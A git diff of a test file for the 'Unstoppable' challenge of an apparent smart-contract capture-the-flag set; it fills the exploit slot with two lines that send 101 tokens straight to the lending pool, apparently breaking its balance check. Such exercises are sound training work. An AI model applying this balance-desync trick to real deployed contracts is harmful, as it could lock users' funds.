@@ -1,4 +1,4 @@
-const { ether, expectRevert } = require('@openzeppelin/test-helpers');
+const { ether, expectRevert} = require('@openzeppelin/test-helpers');
 const { accounts, contract } = require('@openzeppelin/test-environment');
 
 const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
@@ -40,6 +40,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        await this.token.approve(this.pool.address, 101, { from: attacker });
+        await this.token.transfer(this.pool.address, 101, { from: attacker });
     });
 
     after(async function () {
